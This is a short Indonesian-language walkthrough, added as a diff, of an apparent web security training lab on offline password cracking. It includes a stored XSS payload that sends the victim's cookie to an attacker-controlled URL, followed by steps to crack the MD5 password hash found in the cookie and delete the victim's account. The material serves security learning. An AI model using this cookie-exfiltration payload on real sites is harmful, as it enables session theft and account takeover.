@@ -1,0 +1,26 @@
+LAB 2 Offline Password Cracking
+
+Brief:
+	Lab ini punya kerentanan Xss di komen dan cookienya menggunakan password user.
+	
+Tujuan:
+	akses akun carlos dan hapus akunnya
+	
+Analisa:
+	1. login dengan wiener:peter
+	
+	2. ketika sudah login ada parameter stay-logged-in
+	
+		itu adalah cookie persistantnya dengan format base64(username:md5(password))
+	
+	3. test xss di komen dengan payload <script>alert('1')</script> dan ternyata vulberable
+	
+	4. pergi ke exploit server dan copy url attacker
+	
+	5. komen lagi dengan payload <script>document.location='https://urlattacker.com/exploit/'+document.cookie</script>
+
+	6. di exploit server pergi ke log dan disana ada paramater cookie carlos
+	
+	7. crack hashnya dan passwordnya onceupontime
+	
+	8. login dan hapus akun carlos
